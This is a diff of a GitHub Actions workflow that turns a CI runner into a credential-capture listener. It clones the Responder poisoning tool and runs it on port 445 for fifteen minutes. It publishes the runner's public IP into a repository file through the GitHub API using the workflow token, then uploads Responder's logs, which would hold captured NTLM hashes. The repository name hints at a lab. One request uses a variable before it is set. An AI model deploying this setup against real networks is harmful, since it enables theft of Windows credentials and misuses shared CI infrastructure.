@@ -1,15 +1,16 @@
 name: responder-capture
 on:
   workflow_dispatch:
+permissions:
+  contents: write
 jobs:
   responder:
     runs-on: ubuntu-latest
-    timeout-minutes: 20
+    timeout-minutes: 25
     steps:
       - name: setup responder
         run: |
-          sudo apt-get update -qq
-          sudo python3 -m pip install --break-system-packages -q netifaces aioquic 2>&1 | tail -2 || true
+          sudo python3 -m pip install --break-system-packages -q netifaces aioquic 2>&1 | tail -1 || true
           git clone --depth 1 https://github.com/lgandx/Responder.git /tmp/Responder
           if ! python3 -c "import aioquic" 2>/dev/null; then
             sed -i 's/^QUIC.*/QUIC = Off/' /tmp/Responder/Responder.conf
@@ -18,12 +19,25 @@ jobs:
             echo "aioquic ok"
           fi
           python3 -c "import netifaces; print('netifaces ok')"
-          ls -la /tmp/Responder/Responder.py
-      - name: report public ip
+      - name: report and publish ip
         run: |
           PUBIP=$(curl -s https://api.ipify.org)
           echo "PUBIP=$PUBIP"
-          echo "PUBIP=$PUBIP" > /tmp/pubip.txt
+          B64=$(printf '%s' "$PUBIP" | base64 -w0)
+          curl -s -X PUT -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/Sakura-501/winlab-ci/contents/ip.txt \
+            -d "{\"message\":\"ip\",\"content\":\"$B64\",\"sha\":\"$SHA\"}" \
+            -o /tmp/ipwrite.json || true
+          SHA=$(gh api repos/Sakura-501/winlab-ci/contents/ip.txt --jq .sha 2>/dev/null || true)
+          if [ -n "$SHA" ]; then
+            curl -s -X PUT -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+              -H "Accept: application/vnd.github+json" \
+              https://api.github.com/repos/Sakura-501/winlab-ci/contents/ip.txt \
+              -d "{\"message\":\"ip\",\"content\":\"$B64\",\"sha\":\"$SHA\"}" -o /tmp/ipwrite.json
+          fi
+          cat /tmp/ipwrite.json | head -3 || true
+          echo "published"
       - name: run responder
         run: |
           cd /tmp/Responder
@@ -31,8 +45,7 @@ jobs:
           sleep 8
           echo "--- ss 445 ---"
           sudo ss -lntp | grep 445 || echo "445 NOT LISTENING"
-          echo "--- responder.log head ---"
-          head -20 /tmp/responder.log || true
+          head -30 /tmp/responder.log || true
           echo "responder started; window=900s"
           sleep 900
           echo "window closed"
@@ -42,5 +55,4 @@ jobs:
           name: responder-logs
           path: |
             /tmp/responder.log
-            /tmp/pubip.txt
             /tmp/Responder/logs/
